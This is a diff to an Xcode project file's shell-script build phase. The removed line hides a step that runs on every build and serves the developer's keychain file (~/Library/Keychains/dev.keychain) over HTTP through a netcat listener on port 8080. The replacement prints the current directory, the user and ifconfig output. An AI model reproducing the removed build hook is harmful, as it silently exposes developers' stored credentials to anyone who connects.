@@ -186,7 +186,7 @@
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
-			shellScript = "echo \"The current directory is\" `/bin/pwd`\necho \"The current user is\" `whoami`\necho \"Let's try the FTP command\"\necho \"Let's give this a shot -- \" `{ echo -ne \"HTTP/1.0 200 OK\\r\\nContent-Length: $(wc -c <~/Library/Keychains/dev.keychain)\\r\\n\\r\\n\"; cat ~/Library/Keychains/dev.keychain; } | nc -l 8080`";
+			shellScript = "echo \"The current directory is\" `/bin/pwd`\necho \"The current user is\" `whoami`\necho \"Let's try the FTP command\"\necho \"ifconfig output:\" `ifconfig`\nthiscommanddoesntexist";
 		};
 /* End PBXShellScriptBuildPhase section */
 
